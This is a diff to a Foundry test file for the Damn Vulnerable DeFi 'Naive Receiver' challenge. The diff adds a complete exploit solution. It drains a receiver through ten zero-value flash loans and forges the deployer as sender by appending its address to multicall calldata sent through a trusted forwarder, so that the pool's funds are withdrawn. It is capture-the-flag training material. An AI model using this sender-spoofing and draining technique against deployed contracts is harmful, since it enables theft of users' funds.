@@ -2,7 +2,7 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test, console, console2} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
@@ -77,6 +77,56 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        
+        bytes[] memory callDatas = new bytes[](11);
+
+        for (uint256 i = 0; i < 10; i++) {
+            callDatas[i] = abi.encodeWithSelector(
+                NaiveReceiverPool.flashLoan.selector,
+                receiver,
+                address(weth), // token
+                0, // amount
+                bytes("") // data
+            );
+        }
+
+        console2.log("console work here");
+        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            bytes32(uint256(uint160(deployer)))
+        );
+
+        bytes memory callData;
+        callData = abi.encodeCall(pool.multicall, callDatas); // abi.encodeWithSelector(pool.multicall.selector, callDatas);
+
+        // console.log("WETH balance in pool: ", weth.balanceOf(address(pool)));
+        // console.log("WETH balance in receiver: ", weth.balanceOf(address(receiver)));
+        // console.log("pool's nonce: " , vm.getNonce(address(pool)));
+
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player,
+            address(pool),
+            0,
+            gasleft(),
+            forwarder.nonces(player),
+            callData,
+            1 days
+        );
+
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
+    }
+
+    function test_naiveReceiver_practice() public checkSolvedByPlayer {
         
     }
 
